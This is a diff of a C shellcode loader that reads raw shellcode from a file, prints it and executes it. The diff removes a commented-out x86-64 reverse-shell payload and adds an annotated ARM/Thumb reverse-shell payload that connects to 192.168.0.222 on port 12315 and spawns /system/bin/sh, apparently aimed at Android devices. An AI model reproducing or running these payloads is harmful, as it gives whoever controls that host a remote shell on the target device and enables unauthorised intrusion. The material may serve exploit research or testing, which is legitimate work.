@@ -3,24 +3,37 @@
   to run shellcode
 */
 
-
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
 
-/*
-char shellcode[] = \
-    "\x6a\x02\x5f\x6a\x01\x5e\x6a\x00"
-    "\x5a\x6a\x29\x58\x0f\x05\x48\x97"
-    "\x6a\x00\x48\xb8\x02\x00\x30\x1b"
-    "\xc0\xa8\x00\xde\x50\x48\x89\xe6"
-    "\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
-    "\x6a\x02\x5e\x6a\x21\x58\x0f\x05"
-    "\x48\xff\xce\x79\xf6\x31\xc0\x50"
-    "\x48\xbf\x2f\x62\x69\x6e\x2f\x2f"
-    "\x73\x68\x57\xb0\x3b\x48\x89\xe7"
-    "\x31\xf6\x31\xd2\x0f\x05";
-*/
+// #define __TEST_SC
+
+#ifdef __TEST_SC
+
+char shellcode[] = {
+	/* Enter Thumb mode (for proof of concept) */
+	0x01, 0x10, 0x8F, 0xE2, 0x11, 0xFF, 0x2F, 0xE1,
+
+	/* 16-bit instructions follow */
+	0x02, 0x20, 0x01, 0x21, 0x92, 0x1A, 0x0F, 0x02, 0x19, 0x37, 0x01,
+	0xDF, 0x06, 0x1C, 0x08, 0xA1, 0x10, 0x22, 0x02, 0x37, 0x01, 0xDF,
+	0x3F, 0x27, 0x02, 0x21, 0x30, 0x1c, 0x01, 0xdf, 0x01, 0x39, 0xFB,
+	0xD5, 0x05, 0xA0, 0x92, 0x1a, 0x05, 0xb4, 0x69, 0x46, 0x0b, 0x27,
+	0x01, 0xDF, 0xC0, 0x46,
+
+	/* struct sockaddr */
+	0x02, 0x00,
+	/* port: 12315 0x301B */
+	0x1B, 0x30,
+	/* ip: 192.168.0.222 0xDE00A8C0 */
+	0xC0, 0xA8, 0x00, 0xDE,
+
+	/* "/system/bin/sh" */
+	0x2f, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x2f, 0x62, 0x69, 0x6e,
+	0x2f, 0x73, 0x68, 0x00
+};
+#endif
 
 void print(char* data, int len) {
   int x = 0;
@@ -66,6 +79,7 @@ int run_sc(char* sc) {
 }
 
 int main(int argc, char** argv) {
+#ifndef __TEST_SC
   if (argc < 2) {
     printf("input shellcode raw path.\n");
     return -1;
@@ -84,10 +98,14 @@ int main(int argc, char** argv) {
 
   fseek(fp, 0, SEEK_SET);
   fread(shellcode, 1, size, fp);
+#else
+  int size = sizeof(shellcode);
+#endif
 
   printf("\n---------------- shellcode (0x%x)----------------\n", size);
   print(shellcode, size);
   printf("---------------- end ----------------\n\n");
 
   return run_sc(shellcode);
+  while(1) {}
 }
